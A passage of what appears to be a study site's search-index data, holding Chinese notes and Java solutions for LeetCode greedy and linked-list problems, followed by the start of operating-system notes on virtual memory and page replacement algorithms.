\u9898\u76EE\u63CF\u8FF0\uFF1Aflowerbed \u6570\u7EC4\u4E2D 1 \u8868\u793A\u5DF2\u7ECF\u79CD\u4E0B\u4E86\u82B1\u6735\u3002\u82B1\u6735\u4E4B\u95F4\u81F3\u5C11\u9700\u8981\u4E00\u4E2A\u5355\u4F4D\u7684\u95F4\u9694\uFF0C\u6C42\u89E3\u662F\u5426\u80FD\u79CD\u4E0B n \u6735\u82B1\u3002
public boolean canPlaceFlowers(int[] flowerbed, int n) { int len = flowerbed.length; int cnt = 0; for (int i = 0; i < len && cnt < n; i++) { if (flowerbed[i] == 1) { continue; } int pre = i == 0 ? 0 : flowerbed[i - 1]; int next = i == len - 1 ? 0 : flowerbed[i + 1]; if (pre == 0 && next == 0) { cnt++; flowerbed[i] = 1; } } return cnt >= n;
}`},{header:"8. \u5224\u65AD\u662F\u5426\u4E3A\u5B50\u5E8F\u5217",slug:"_8-\u5224\u65AD\u662F\u5426\u4E3A\u5B50\u5E8F\u5217",content:`392. Is Subsequence (Medium)
Leetcode / \u529B\u6263
s = "abc", t = "ahbgdc"
Return true.
public boolean isSubsequence(String s, String t) { int index = -1; for (char c : s.toCharArray()) { index = t.indexOf(c, index + 1); if (index == -1) { return false; } } return true;
}`},{header:"9. \u4FEE\u6539\u4E00\u4E2A\u6570\u6210\u4E3A\u975E\u9012\u51CF\u6570\u7EC4",slug:"_9-\u4FEE\u6539\u4E00\u4E2A\u6570\u6210\u4E3A\u975E\u9012\u51CF\u6570\u7EC4",content:`665. Non-decreasing Array (Easy)
Leetcode / \u529B\u6263
Input: [4,2,3]
Output: True
Explanation: You could modify the first 4 to 1 to get a non-decreasing array.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5224\u65AD\u4E00\u4E2A\u6570\u7EC4\u662F\u5426\u80FD\u53EA\u4FEE\u6539\u4E00\u4E2A\u6570\u5C31\u6210\u4E3A\u975E\u9012\u51CF\u6570\u7EC4\u3002
\u5728\u51FA\u73B0 nums[i] < nums[i - 1] \u65F6\uFF0C\u9700\u8981\u8003\u8651\u7684\u662F\u5E94\u8BE5\u4FEE\u6539\u6570\u7EC4\u7684\u54EA\u4E2A\u6570\uFF0C\u4F7F\u5F97\u672C\u6B21\u4FEE\u6539\u80FD\u4F7F i \u4E4B\u524D\u7684\u6570\u7EC4\u6210\u4E3A\u975E\u9012\u51CF\u6570\u7EC4\uFF0C\u5E76\u4E14 \u4E0D\u5F71\u54CD\u540E\u7EED\u7684\u64CD\u4F5C \u3002\u4F18\u5148\u8003\u8651\u4EE4 nums[i - 1] = nums[i]\uFF0C\u56E0\u4E3A\u5982\u679C\u4FEE\u6539 nums[i] = nums[i - 1] \u7684\u8BDD\uFF0C\u90A3\u4E48 nums[i] \u8FD9\u4E2A\u6570\u4F1A\u53D8\u5927\uFF0C\u5C31\u6709\u53EF\u80FD\u6BD4 nums[i + 1] \u5927\uFF0C\u4ECE\u800C\u5F71\u54CD\u4E86\u540E\u7EED\u64CD\u4F5C\u3002\u8FD8\u6709\u4E00\u4E2A\u6BD4\u8F83\u7279\u522B\u7684\u60C5\u51B5\u5C31\u662F nums[i] < nums[i - 2]\uFF0C\u4FEE\u6539 nums[i - 1] = nums[i] \u4E0D\u80FD\u4F7F\u6570\u7EC4\u6210\u4E3A\u975E\u9012\u51CF\u6570\u7EC4\uFF0C\u53EA\u80FD\u4FEE\u6539 nums[i] = nums[i - 1]\u3002
public boolean checkPossibility(int[] nums) { int cnt = 0; for (int i = 1; i < nums.length && cnt < 2; i++) { if (nums[i] >= nums[i - 1]) { continue; } cnt++; if (i - 2 >= 0 && nums[i - 2] > nums[i]) { nums[i] = nums[i - 1]; } else { nums[i - 1] = nums[i]; } } return cnt <= 1;
}`},{header:"10. \u5B50\u6570\u7EC4\u6700\u5927\u7684\u548C",slug:"_10-\u5B50\u6570\u7EC4\u6700\u5927\u7684\u548C",content:`53. Maximum Subarray (Easy)
Leetcode / \u529B\u6263
For example, given the array [-2,1,-3,4,-1,2,1,-5,4],
the contiguous subarray [4,-1,2,1] has the largest sum = 6.
public int maxSubArray(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int preSum = nums[0]; int maxSum = preSum; for (int i = 1; i < nums.length; i++) { preSum = preSum > 0 ? preSum + nums[i] : nums[i]; maxSum = Math.max(maxSum, preSum); } return maxSum;
}`},{header:"11. \u5206\u9694\u5B57\u7B26\u4E32\u4F7F\u540C\u79CD\u5B57\u7B26\u51FA\u73B0\u5728\u4E00\u8D77",slug:"_11-\u5206\u9694\u5B57\u7B26\u4E32\u4F7F\u540C\u79CD\u5B57\u7B26\u51FA\u73B0\u5728\u4E00\u8D77",content:`763. Partition Labels (Medium)
Leetcode / \u529B\u6263
Input: S = "ababcbacadefegdehijhklij"
Output: [9,7,8]
Explanation:
The partition is "ababcbaca", "defegde", "hijhklij".
This is a partition so that each letter appears in at most one part.
A partition like "ababcbacadefegde", "hijhklij" is incorrect, because it splits S into less parts.
public List<Integer> partitionLabels(String S) { int[] lastIndexsOfChar = new int[26]; for (int i = 0; i < S.length(); i++) { lastIndexsOfChar[char2Index(S.charAt(i))] = i; } List<Integer> partitions = new ArrayList<>(); int firstIndex = 0; while (firstIndex < S.length()) { int lastIndex = firstIndex; for (int i = firstIndex; i < S.length() && i <= lastIndex; i++) { int index = lastIndexsOfChar[char2Index(S.charAt(i))]; if (index > lastIndex) { lastIndex = index; } } partitions.add(lastIndex - firstIndex + 1); firstIndex = lastIndex + 1; } return partitions;
} private int char2Index(char c) { return c - 'a';
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E9%93%BE%E8%A1%A8.html",title:"Leetcode \u9898\u89E3 - \u94FE\u8868",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u94FE\u8868",slug:"leetcode-\u9898\u89E3-\u94FE\u8868",content:`Leetcode \u9898\u89E3 - \u94FE\u8868 1. \u627E\u51FA\u4E24\u4E2A\u94FE\u8868\u7684\u4EA4\u70B9
2. \u94FE\u8868\u53CD\u8F6C
3. \u5F52\u5E76\u4E24\u4E2A\u6709\u5E8F\u7684\u94FE\u8868
4. \u4ECE\u6709\u5E8F\u94FE\u8868\u4E2D\u5220\u9664\u91CD\u590D\u8282\u70B9
5. \u5220\u9664\u94FE\u8868\u7684\u5012\u6570\u7B2C n \u4E2A\u8282\u70B9
6. \u4EA4\u6362\u94FE\u8868\u4E2D\u7684\u76F8\u90BB\u7ED3\u70B9
7. \u94FE\u8868\u6C42\u548C
8. \u56DE\u6587\u94FE\u8868
9. \u5206\u9694\u94FE\u8868
10. \u94FE\u8868\u5143\u7D20\u6309\u5947\u5076\u805A\u96C6 \u94FE\u8868\u662F\u7A7A\u8282\u70B9\uFF0C\u6216\u8005\u6709\u4E00\u4E2A\u503C\u548C\u4E00\u4E2A\u6307\u5411\u4E0B\u4E00\u4E2A\u94FE\u8868\u7684\u6307\u9488\uFF0C\u56E0\u6B64\u5F88\u591A\u94FE\u8868\u95EE\u9898\u53EF\u4EE5\u7528\u9012\u5F52\u6765\u5904\u7406\u3002`},{header:"1. \u627E\u51FA\u4E24\u4E2A\u94FE\u8868\u7684\u4EA4\u70B9",slug:"_1-\u627E\u51FA\u4E24\u4E2A\u94FE\u8868\u7684\u4EA4\u70B9",content:`160. Intersection of Two Linked Lists (Easy)
Leetcode / \u529B\u6263
\u4F8B\u5982\u4EE5\u4E0B\u793A\u4F8B\u4E2D A \u548C B \u4E24\u4E2A\u94FE\u8868\u76F8\u4EA4\u4E8E c1\uFF1A
A: a1 \u2192 a2 \u2198 c1 \u2192 c2 \u2192 c3 \u2197
B: b1 \u2192 b2 \u2192 b3
\u4F46\u662F\u4E0D\u4F1A\u51FA\u73B0\u4EE5\u4E0B\u76F8\u4EA4\u7684\u60C5\u51B5\uFF0C\u56E0\u4E3A\u6BCF\u4E2A\u8282\u70B9\u53EA\u6709\u4E00\u4E2A next \u6307\u9488\uFF0C\u4E5F\u5C31\u53EA\u80FD\u6709\u4E00\u4E2A\u540E\u7EE7\u8282\u70B9\uFF0C\u800C\u4EE5\u4E0B\u793A\u4F8B\u4E2D\u8282\u70B9 c \u6709\u4E24\u4E2A\u540E\u7EE7\u8282\u70B9\u3002
A: a1 \u2192 a2 d1 \u2192 d2 \u2198 \u2197 c \u2197 \u2198
B: b1 \u2192 b2 \u2192 b3 e1 \u2192 e2
\u8981\u6C42\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\u3002\u5982\u679C\u4E0D\u5B58\u5728\u4EA4\u70B9\u5219\u8FD4\u56DE null\u3002
\u8BBE A \u7684\u957F\u5EA6\u4E3A a + c\uFF0CB \u7684\u957F\u5EA6\u4E3A b + c\uFF0C\u5176\u4E2D c \u4E3A\u5C3E\u90E8\u516C\u5171\u90E8\u5206\u957F\u5EA6\uFF0C\u53EF\u77E5 a + c + b = b + c + a\u3002
\u5F53\u8BBF\u95EE A \u94FE\u8868\u7684\u6307\u9488\u8BBF\u95EE\u5230\u94FE\u8868\u5C3E\u90E8\u65F6\uFF0C\u4EE4\u5B83\u4ECE\u94FE\u8868 B \u7684\u5934\u90E8\u5F00\u59CB\u8BBF\u95EE\u94FE\u8868 B\uFF1B\u540C\u6837\u5730\uFF0C\u5F53\u8BBF\u95EE B \u94FE\u8868\u7684\u6307\u9488\u8BBF\u95EE\u5230\u94FE\u8868\u5C3E\u90E8\u65F6\uFF0C\u4EE4\u5B83\u4ECE\u94FE\u8868 A \u7684\u5934\u90E8\u5F00\u59CB\u8BBF\u95EE\u94FE\u8868 A\u3002\u8FD9\u6837\u5C31\u80FD\u63A7\u5236\u8BBF\u95EE A \u548C B \u4E24\u4E2A\u94FE\u8868\u7684\u6307\u9488\u80FD\u540C\u65F6\u8BBF\u95EE\u5230\u4EA4\u70B9\u3002
\u5982\u679C\u4E0D\u5B58\u5728\u4EA4\u70B9\uFF0C\u90A3\u4E48 a + b = b + a\uFF0C\u4EE5\u4E0B\u5B9E\u73B0\u4EE3\u7801\u4E2D l1 \u548C l2 \u4F1A\u540C\u65F6\u4E3A null\uFF0C\u4ECE\u800C\u9000\u51FA\u5FAA\u73AF\u3002
public ListNode getIntersectionNode(ListNode headA, ListNode headB) { ListNode l1 = headA, l2 = headB; while (l1 != l2) { l1 = (l1 == null) ? headB : l1.next; l2 = (l2 == null) ? headA : l2.next; } return l1;
}
\u5982\u679C\u53EA\u662F\u5224\u65AD\u662F\u5426\u5B58\u5728\u4EA4\u70B9\uFF0C\u90A3\u4E48\u5C31\u662F\u53E6\u4E00\u4E2A\u95EE\u9898\uFF0C\u5373 \u7F16\u7A0B\u4E4B\u7F8E 3.6 \u7684\u95EE\u9898\u3002\u6709\u4E24\u79CD\u89E3\u6CD5\uFF1A \u628A\u7B2C\u4E00\u4E2A\u94FE\u8868\u7684\u7ED3\u5C3E\u8FDE\u63A5\u5230\u7B2C\u4E8C\u4E2A\u94FE\u8868\u7684\u5F00\u5934\uFF0C\u770B\u7B2C\u4E8C\u4E2A\u94FE\u8868\u662F\u5426\u5B58\u5728\u73AF\uFF1B
\u6216\u8005\u76F4\u63A5\u6BD4\u8F83\u4E24\u4E2A\u94FE\u8868\u7684\u6700\u540E\u4E00\u4E2A\u8282\u70B9\u662F\u5426\u76F8\u540C\u3002`},{header:"2. \u94FE\u8868\u53CD\u8F6C",slug:"_2-\u94FE\u8868\u53CD\u8F6C",content:`206. Reverse Linked List (Easy)
Leetcode / \u529B\u6263
\u9012\u5F52
public ListNode reverseList(ListNode head) { if (head == null || head.next == null) { return head; } ListNode next = head.next; ListNode newHead = reverseList(next); next.next = head; head.next = null; return newHead;
}
\u5934\u63D2\u6CD5
public ListNode reverseList(ListNode head) { ListNode newHead = new ListNode(-1); while (head != null) { ListNode next = head.next; head.next = newHead.next; newHead.next = head; head = next; } return newHead.next;
}`},{header:"3. \u5F52\u5E76\u4E24\u4E2A\u6709\u5E8F\u7684\u94FE\u8868",slug:"_3-\u5F52\u5E76\u4E24\u4E2A\u6709\u5E8F\u7684\u94FE\u8868",content:`21. Merge Two Sorted Lists (Easy)
Leetcode / \u529B\u6263
public ListNode mergeTwoLists(ListNode l1, ListNode l2) { if (l1 == null) return l2; if (l2 == null) return l1; if (l1.val < l2.val) { l1.next = mergeTwoLists(l1.next, l2); return l1; } else { l2.next = mergeTwoLists(l1, l2.next); return l2; }
}`},{header:"4. \u4ECE\u6709\u5E8F\u94FE\u8868\u4E2D\u5220\u9664\u91CD\u590D\u8282\u70B9",slug:"_4-\u4ECE\u6709\u5E8F\u94FE\u8868\u4E2D\u5220\u9664\u91CD\u590D\u8282\u70B9",content:`83. Remove Duplicates from Sorted List (Easy)
Leetcode / \u529B\u6263
Given 1->1->2, return 1->2.
Given 1->1->2->3->3, return 1->2->3.
public ListNode deleteDuplicates(ListNode head) { if (head == null || head.next == null) return head; head.next = deleteDuplicates(head.next); return head.val == head.next.val ? head.next : head;
}`},{header:"5. \u5220\u9664\u94FE\u8868\u7684\u5012\u6570\u7B2C n \u4E2A\u8282\u70B9",slug:"_5-\u5220\u9664\u94FE\u8868\u7684\u5012\u6570\u7B2C-n-\u4E2A\u8282\u70B9",content:`19. Remove Nth Node From End of List (Medium)
Leetcode / \u529B\u6263
Given linked list: 1->2->3->4->5, and n = 2.
After removing the second node from the end, the linked list becomes 1->2->3->5.
public ListNode removeNthFromEnd(ListNode head, int n) { ListNode fast = head; while (n-- > 0) { fast = fast.next; } if (fast == null) return head.next; ListNode slow = head; while (fast.next != null) { fast = fast.next; slow = slow.next; } slow.next = slow.next.next; return head;
}`},{header:"6. \u4EA4\u6362\u94FE\u8868\u4E2D\u7684\u76F8\u90BB\u7ED3\u70B9",slug:"_6-\u4EA4\u6362\u94FE\u8868\u4E2D\u7684\u76F8\u90BB\u7ED3\u70B9",content:`24. Swap Nodes in Pairs (Medium)
Leetcode / \u529B\u6263
Given 1->2->3->4, you should return the list as 2->1->4->3.
\u9898\u76EE\u8981\u6C42\uFF1A\u4E0D\u80FD\u4FEE\u6539\u7ED3\u70B9\u7684 val \u503C\uFF0CO(1) \u7A7A\u95F4\u590D\u6742\u5EA6\u3002
public ListNode swapPairs(ListNode head) { ListNode node = new ListNode(-1); node.next = head; ListNode pre = node; while (pre.next != null && pre.next.next != null) { ListNode l1 = pre.next, l2 = pre.next.next; ListNode next = l2.next; l1.next = next; l2.next = l1; pre.next = l2; pre = l1; } return node.next;
}`},{header:"7. \u94FE\u8868\u6C42\u548C",slug:"_7-\u94FE\u8868\u6C42\u548C",content:`445. Add Two Numbers II (Medium)
Leetcode / \u529B\u6263
Input: (7 -> 2 -> 4 -> 3) + (5 -> 6 -> 4)
Output: 7 -> 8 -> 0 -> 7
\u9898\u76EE\u8981\u6C42\uFF1A\u4E0D\u80FD\u4FEE\u6539\u539F\u59CB\u94FE\u8868\u3002
public ListNode addTwoNumbers(ListNode l1, ListNode l2) { Stack<Integer> l1Stack = buildStack(l1); Stack<Integer> l2Stack = buildStack(l2); ListNode head = new ListNode(-1); int carry = 0; while (!l1Stack.isEmpty() || !l2Stack.isEmpty() || carry != 0) { int x = l1Stack.isEmpty() ? 0 : l1Stack.pop(); int y = l2Stack.isEmpty() ? 0 : l2Stack.pop(); int sum = x + y + carry; ListNode node = new ListNode(sum % 10); node.next = head.next; head.next = node; carry = sum / 10; } return head.next;
} private Stack<Integer> buildStack(ListNode l) { Stack<Integer> stack = new Stack<>(); while (l != null) { stack.push(l.val); l = l.next; } return stack;
}`},{header:"8. \u56DE\u6587\u94FE\u8868",slug:"_8-\u56DE\u6587\u94FE\u8868",content:`234. Palindrome Linked List (Easy)
Leetcode / \u529B\u6263
\u9898\u76EE\u8981\u6C42\uFF1A\u4EE5 O(1) \u7684\u7A7A\u95F4\u590D\u6742\u5EA6\u6765\u6C42\u89E3\u3002
\u5207\u6210\u4E24\u534A\uFF0C\u628A\u540E\u534A\u6BB5\u53CD\u8F6C\uFF0C\u7136\u540E\u6BD4\u8F83\u4E24\u534A\u662F\u5426\u76F8\u7B49\u3002
public boolean isPalindrome(ListNode head) { if (head == null || head.next == null) return true; ListNode slow = head, fast = head.next; while (fast != null && fast.next != null) { slow = slow.next; fast = fast.next.next; } if (fast != null) slow = slow.next; // \u5076\u6570\u8282\u70B9\uFF0C\u8BA9 slow \u6307\u5411\u4E0B\u4E00\u4E2A\u8282\u70B9 cut(head, slow); // \u5207\u6210\u4E24\u4E2A\u94FE\u8868 return isEqual(head, reverse(slow));
} private void cut(ListNode head, ListNode cutNode) { while (head.next != cutNode) { head = head.next; } head.next = null;
} private ListNode reverse(ListNode head) { ListNode newHead = null; while (head != null) { ListNode nextNode = head.next; head.next = newHead; newHead = head; head = nextNode; } return newHead;
} private boolean isEqual(ListNode l1, ListNode l2) { while (l1 != null && l2 != null) { if (l1.val != l2.val) return false; l1 = l1.next; l2 = l2.next; } return true;
}`},{header:"9. \u5206\u9694\u94FE\u8868",slug:"_9-\u5206\u9694\u94FE\u8868",content:`725. Split Linked List in Parts(Medium)
Leetcode / \u529B\u6263
Input:
root = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10], k = 3
Output: [[1, 2, 3, 4], [5, 6, 7], [8, 9, 10]]
Explanation:
The input has been split into consecutive parts with size difference at most 1, and earlier parts are a larger size than the later parts.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u628A\u94FE\u8868\u5206\u9694\u6210 k \u90E8\u5206\uFF0C\u6BCF\u90E8\u5206\u7684\u957F\u5EA6\u90FD\u5E94\u8BE5\u5C3D\u53EF\u80FD\u76F8\u540C\uFF0C\u6392\u5728\u524D\u9762\u7684\u957F\u5EA6\u5E94\u8BE5\u5927\u4E8E\u7B49\u4E8E\u540E\u9762\u7684\u3002
public ListNode[] splitListToParts(ListNode root, int k) { int N = 0; ListNode cur = root; while (cur != null) { N++; cur = cur.next; } int mod = N % k; int size = N / k; ListNode[] ret = new ListNode[k]; cur = root; for (int i = 0; cur != null && i < k; i++) { ret[i] = cur; int curSize = size + (mod-- > 0 ? 1 : 0); for (int j = 0; j < curSize - 1; j++) { cur = cur.next; } ListNode next = cur.next; cur.next = null; cur = next; } return ret;
}`},{header:"10. \u94FE\u8868\u5143\u7D20\u6309\u5947\u5076\u805A\u96C6",slug:"_10-\u94FE\u8868\u5143\u7D20\u6309\u5947\u5076\u805A\u96C6",content:`328. Odd Even Linked List (Medium)
Leetcode / \u529B\u6263
Example:
Given 1->2->3->4->5->NULL,
return 1->3->5->2->4->NULL.
public ListNode oddEvenList(ListNode head) { if (head == null) { return head; } ListNode odd = head, even = head.next, evenHead = even; while (even != null && even.next != null) { odd.next = odd.next.next; odd = odd.next; even.next = even.next.next; even = even.next; } odd.next = evenHead; return head;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3.html",title:"",pathLocale:"/",contents:[{header:"",slug:"",content:"Leetcode \u9898\u89E3"}]},{path:"/leetcode/",title:"leetcode",pathLocale:"/",contents:[{header:"leetcode",slug:"leetcode",content:""}]},{path:"/pics/",title:"pics",pathLocale:"/",contents:[{header:"pics",slug:"pics",content:""}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/",title:"\u64CD\u4F5C\u7CFB\u7EDF",pathLocale:"/",contents:[{header:"\u64CD\u4F5C\u7CFB\u7EDF",slug:"\u64CD\u4F5C\u7CFB\u7EDF",content:""}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.html",title:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u5185\u5B58\u7BA1\u7406",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u5185\u5B58\u7BA1\u7406",slug:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF-\u5185\u5B58\u7BA1\u7406",content:`\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u5185\u5B58\u7BA1\u7406 \u865A\u62DF\u5185\u5B58
\u5206\u9875\u7CFB\u7EDF\u5730\u5740\u6620\u5C04
\u9875\u9762\u7F6E\u6362\u7B97\u6CD5 1. \u6700\u4F73
2. \u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528
3. \u6700\u8FD1\u672A\u4F7F\u7528
4. \u5148\u8FDB\u5148\u51FA
5. \u7B2C\u4E8C\u6B21\u673A\u4F1A\u7B97\u6CD5
6. \u65F6\u949F \u5206\u6BB5
\u6BB5\u9875\u5F0F
\u5206\u9875\u4E0E\u5206\u6BB5\u7684\u6BD4\u8F83`},{header:"\u865A\u62DF\u5185\u5B58",slug:"\u865A\u62DF\u5185\u5B58",content:`\u865A\u62DF\u5185\u5B58\u7684\u76EE\u7684\u662F\u4E3A\u4E86\u8BA9\u7269\u7406\u5185\u5B58\u6269\u5145\u6210\u66F4\u5927\u7684\u903B\u8F91\u5185\u5B58\uFF0C\u4ECE\u800C\u8BA9\u7A0B\u5E8F\u83B7\u5F97\u66F4\u591A\u7684\u53EF\u7528\u5185\u5B58\u3002
\u4E3A\u4E86\u66F4\u597D\u7684\u7BA1\u7406\u5185\u5B58\uFF0C\u64CD\u4F5C\u7CFB\u7EDF\u5C06\u5185\u5B58\u62BD\u8C61\u6210\u5730\u5740\u7A7A\u95F4\u3002\u6BCF\u4E2A\u7A0B\u5E8F\u62E5\u6709\u81EA\u5DF1\u7684\u5730\u5740\u7A7A\u95F4\uFF0C\u8FD9\u4E2A\u5730\u5740\u7A7A\u95F4\u88AB\u5206\u5272\u6210\u591A\u4E2A\u5757\uFF0C\u6BCF\u4E00\u5757\u79F0\u4E3A\u4E00\u9875\u3002\u8FD9\u4E9B\u9875\u88AB\u6620\u5C04\u5230\u7269\u7406\u5185\u5B58\uFF0C\u4F46\u4E0D\u9700\u8981\u6620\u5C04\u5230\u8FDE\u7EED\u7684\u7269\u7406\u5185\u5B58\uFF0C\u4E5F\u4E0D\u9700\u8981\u6240\u6709\u9875\u90FD\u5FC5\u987B\u5728\u7269\u7406\u5185\u5B58\u4E2D\u3002\u5F53\u7A0B\u5E8F\u5F15\u7528\u5230\u4E0D\u5728\u7269\u7406\u5185\u5B58\u4E2D\u7684\u9875\u65F6\uFF0C\u7531\u786C\u4EF6\u6267\u884C\u5FC5\u8981\u7684\u6620\u5C04\uFF0C\u5C06\u7F3A\u5931\u7684\u90E8\u5206\u88C5\u5165\u7269\u7406\u5185\u5B58\u5E76\u91CD\u65B0\u6267\u884C\u5931\u8D25\u7684\u6307\u4EE4\u3002
\u4ECE\u4E0A\u9762\u7684\u63CF\u8FF0\u4E2D\u53EF\u4EE5\u770B\u51FA\uFF0C\u865A\u62DF\u5185\u5B58\u5141\u8BB8\u7A0B\u5E8F\u4E0D\u7528\u5C06\u5730\u5740\u7A7A\u95F4\u4E2D\u7684\u6BCF\u4E00\u9875\u90FD\u6620\u5C04\u5230\u7269\u7406\u5185\u5B58\uFF0C\u4E5F\u5C31\u662F\u8BF4\u4E00\u4E2A\u7A0B\u5E8F\u4E0D\u9700\u8981\u5168\u90E8\u8C03\u5165\u5185\u5B58\u5C31\u53EF\u4EE5\u8FD0\u884C\uFF0C\u8FD9\u4F7F\u5F97\u6709\u9650\u7684\u5185\u5B58\u8FD0\u884C\u5927\u7A0B\u5E8F\u6210\u4E3A\u53EF\u80FD\u3002\u4F8B\u5982\u6709\u4E00\u53F0\u8BA1\u7B97\u673A\u53EF\u4EE5\u4EA7\u751F 16 \u4F4D\u5730\u5740\uFF0C\u90A3\u4E48\u4E00\u4E2A\u7A0B\u5E8F\u7684\u5730\u5740\u7A7A\u95F4\u8303\u56F4\u662F 0~64K\u3002\u8BE5\u8BA1\u7B97\u673A\u53EA\u6709 32KB \u7684\u7269\u7406\u5185\u5B58\uFF0C\u865A\u62DF\u5185\u5B58\u6280\u672F\u5141\u8BB8\u8BE5\u8BA1\u7B97\u673A\u8FD0\u884C\u4E00\u4E2A 64K \u5927\u5C0F\u7684\u7A0B\u5E8F\u3002`},{header:"\u5206\u9875\u7CFB\u7EDF\u5730\u5740\u6620\u5C04",slug:"\u5206\u9875\u7CFB\u7EDF\u5730\u5740\u6620\u5C04",content:`\u5185\u5B58\u7BA1\u7406\u5355\u5143\uFF08MMU\uFF09\u7BA1\u7406\u7740\u5730\u5740\u7A7A\u95F4\u548C\u7269\u7406\u5185\u5B58\u7684\u8F6C\u6362\uFF0C\u5176\u4E2D\u7684\u9875\u8868\uFF08Page table\uFF09\u5B58\u50A8\u7740\u9875\uFF08\u7A0B\u5E8F\u5730\u5740\u7A7A\u95F4\uFF09\u548C\u9875\u6846\uFF08\u7269\u7406\u5185\u5B58\u7A7A\u95F4\uFF09\u7684\u6620\u5C04\u8868\u3002
\u4E00\u4E2A\u865A\u62DF\u5730\u5740\u5206\u6210\u4E24\u4E2A\u90E8\u5206\uFF0C\u4E00\u90E8\u5206\u5B58\u50A8\u9875\u9762\u53F7\uFF0C\u4E00\u90E8\u5206\u5B58\u50A8\u504F\u79FB\u91CF\u3002
\u4E0B\u56FE\u7684\u9875\u8868\u5B58\u653E\u7740 16 \u4E2A\u9875\uFF0C\u8FD9 16 \u4E2A\u9875\u9700\u8981\u7528 4 \u4E2A\u6BD4\u7279\u4F4D\u6765\u8FDB\u884C\u7D22\u5F15\u5B9A\u4F4D\u3002\u4F8B\u5982\u5BF9\u4E8E\u865A\u62DF\u5730\u5740\uFF080010 000000000100\uFF09\uFF0C\u524D 4 \u4F4D\u662F\u5B58\u50A8\u9875\u9762\u53F7 2\uFF0C\u8BFB\u53D6\u8868\u9879\u5185\u5BB9\u4E3A\uFF08110 1\uFF09\uFF0C\u9875\u8868\u9879\u6700\u540E\u4E00\u4F4D\u8868\u793A\u662F\u5426\u5B58\u5728\u4E8E\u5185\u5B58\u4E2D\uFF0C1 \u8868\u793A\u5B58\u5728\u3002\u540E 12 \u4F4D\u5B58\u50A8\u504F\u79FB\u91CF\u3002\u8FD9\u4E2A\u9875\u5BF9\u5E94\u7684\u9875\u6846\u7684\u5730\u5740\u4E3A \uFF08110 000000000100\uFF09\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cf4386a1-58c9-4eca-a17f-e12b1e9770eb.png" width="500)`},{header:"\u9875\u9762\u7F6E\u6362\u7B97\u6CD5",slug:"\u9875\u9762\u7F6E\u6362\u7B97\u6CD5",content:`\u5728\u7A0B\u5E8F\u8FD0\u884C\u8FC7\u7A0B\u4E2D\uFF0C\u5982\u679C\u8981\u8BBF\u95EE\u7684\u9875\u9762\u4E0D\u5728\u5185\u5B58\u4E2D\uFF0C\u5C31\u53D1\u751F\u7F3A\u9875\u4E2D\u65AD\u4ECE\u800C\u5C06\u8BE5\u9875\u8C03\u5165\u5185\u5B58\u4E2D\u3002\u6B64\u65F6\u5982\u679C\u5185\u5B58\u5DF2\u65E0\u7A7A\u95F2\u7A7A\u95F4\uFF0C\u7CFB\u7EDF\u5FC5\u987B\u4ECE\u5185\u5B58\u4E2D\u8C03\u51FA\u4E00\u4E2A\u9875\u9762\u5230\u78C1\u76D8\u5BF9\u6362\u533A\u4E2D\u6765\u817E\u51FA\u7A7A\u95F4\u3002
\u9875\u9762\u7F6E\u6362\u7B97\u6CD5\u548C\u7F13\u5B58\u6DD8\u6C70\u7B56\u7565\u7C7B\u4F3C\uFF0C\u53EF\u4EE5\u5C06\u5185\u5B58\u770B\u6210\u78C1\u76D8\u7684\u7F13\u5B58\u3002\u5728\u7F13\u5B58\u7CFB\u7EDF\u4E2D\uFF0C\u7F13\u5B58\u7684\u5927\u5C0F\u6709\u9650\uFF0C\u5F53\u6709\u65B0\u7684\u7F13\u5B58\u5230\u8FBE\u65F6\uFF0C\u9700\u8981\u6DD8\u6C70\u4E00\u90E8\u5206\u5DF2\u7ECF\u5B58\u5728\u7684\u7F13\u5B58\uFF0C\u8FD9\u6837\u624D\u6709\u7A7A\u95F4\u5B58\u653E\u65B0\u7684\u7F13\u5B58\u6570\u636E\u3002
\u9875\u9762\u7F6E\u6362\u7B97\u6CD5\u7684\u4E3B\u8981\u76EE\u6807\u662F\u4F7F\u9875\u9762\u7F6E\u6362\u9891\u7387\u6700\u4F4E\uFF08\u4E5F\u53EF\u4EE5\u8BF4\u7F3A\u9875\u7387\u6700\u4F4E\uFF09\u3002`},{header:"1. \u6700\u4F73",slug:"_1-\u6700\u4F73",content:`OPT, Optimal replacement algorithm \u6240\u9009\u62E9\u7684\u88AB\u6362\u51FA\u7684\u9875\u9762\u5C06\u662F\u6700\u957F\u65F6\u95F4\u5185\u4E0D\u518D\u88AB\u8BBF\u95EE\uFF0C\u901A\u5E38\u53EF\u4EE5\u4FDD\u8BC1\u83B7\u5F97\u6700\u4F4E\u7684\u7F3A\u9875\u7387\u3002
\u662F\u4E00\u79CD\u7406\u8BBA\u4E0A\u7684\u7B97\u6CD5\uFF0C\u56E0\u4E3A\u65E0\u6CD5\u77E5\u9053\u4E00\u4E2A\u9875\u9762\u591A\u957F\u65F6\u95F4\u4E0D\u518D\u88AB\u8BBF\u95EE\u3002
\u4E3E\u4F8B\uFF1A\u4E00\u4E2A\u7CFB\u7EDF\u4E3A\u67D0\u8FDB\u7A0B\u5206\u914D\u4E86\u4E09\u4E2A\u7269\u7406\u5757\uFF0C\u5E76\u6709\u5982\u4E0B\u9875\u9762\u5F15\u7528\u5E8F\u5217\uFF1A
